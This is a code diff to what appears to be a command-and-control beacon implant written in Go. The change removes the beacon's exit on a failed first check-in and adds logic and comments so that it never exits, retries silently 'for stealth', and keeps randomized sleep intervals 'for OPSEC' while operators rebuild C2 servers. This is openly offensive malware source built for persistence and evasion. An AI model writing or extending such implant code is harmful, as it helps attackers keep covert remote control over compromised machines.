@@ -377,13 +377,6 @@ func (b *Beacon) sendResult(taskID, result string) error {
 func (b *Beacon) runBeacon() {
 	b.running = true
 
-	// Initial check-in
-	_, err := b.checkIn()
-	if err != nil {
-		// Silent failure for stealth
-		return
-	}
-
 	// Main beacon loop with randomized sleep intervals
 	sleepMin := b.client.config.SleepMin
 	sleepMax := b.client.config.SleepMax
@@ -395,15 +388,20 @@ func (b *Beacon) runBeacon() {
 		sleepMax = sleepMin + 10 // Default maximum
 	}
 
+	// CRITICAL: Beacon NEVER exits, even if all C2 servers are down
+	// This allows operators to tear down and rebuild infrastructure
+	// while beacons continue to persist and automatically reconnect
 	for b.running {
 		// Randomize sleep interval between min and max for OPSEC
 		sleepDuration := time.Duration(sleepMin+rand.Intn(sleepMax-sleepMin+1)) * time.Second
 		time.Sleep(sleepDuration)
 
-		// Send check-in
+		// Send check-in - if it fails, beacon continues trying
 		response, err := b.checkIn()
 		if err != nil {
-			continue // Silent failure for stealth
+			// Silent failure for stealth - beacon will retry on next iteration
+			// Domain selection already handles failover and retry logic
+			continue
 		}
 
 		// Check for DOMAINS response (sent on first check-in)
